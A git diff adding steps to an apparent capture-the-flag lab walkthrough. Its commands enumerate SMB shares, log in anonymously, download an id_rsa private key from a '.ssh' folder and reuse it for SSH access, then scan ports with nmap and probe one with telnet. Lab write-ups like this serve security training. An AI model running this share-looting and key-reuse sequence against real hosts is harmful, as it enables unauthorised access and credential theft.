@@ -19,18 +19,110 @@ enum4linux <IP> -a
 We have username and share name provided in the question
 
 ```
-smbclient //<IP>/secret -U suit -p 445
+smbclient //10.48.181.56/secret -U suit -p 445
 ```
 
 We are trying anonymous login here
+
+```
+smbclient -L 10.48.181.56
+```
 
 After enumerating we will find a share name called profiles
 
 ![enum results](THM/Assets/1.png)
 
 ```
-smbclient //<IP>/profiles -U Anonymous
+smbclient //10.48.181.56/profiles -U Anonymous
 ```
+
+We are logged in
+
+![[THM/Assets/2.png]]
+
+```
+more "Working From Home Information.txt"
+```
+
+```
+cd .ssh
+```
+
+```
+ls
+```
+
+```
+get id_rsa
+```
+
+![[THM/Assets/3.png]]
+
+Now we will use this rsa file to login
+
+```
+chmod 600 id_rsa
+```
+
+```
+ssh -i id_rsa cactus@<IP>
+```
+
+![[THM/Assets/4.png]]
+
+```
+ls
+```
+
+```
+cat smb.txt
+```
+
+![[THM/Assets/5.png]]
+
+#### Task-6 
+
+This one scans a lot of ports so it takes time
+
+```
+nmap -p- -vv -T5 10.48.148.51
+```
+
+![[THM/Assets/6.png]]
+
+```
+nmap -p8012 -v  10.48.148.51
+```
+
+We found a port 8012 
+
+```
+telnet 10.48.148.51 8012
+```
+
+![[THM/Assets/7.png]]
+
+#### Task-9
+
+```
+nmap -F 10.49.136.137 
+```
+
+![[THM/Assets/8.png]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
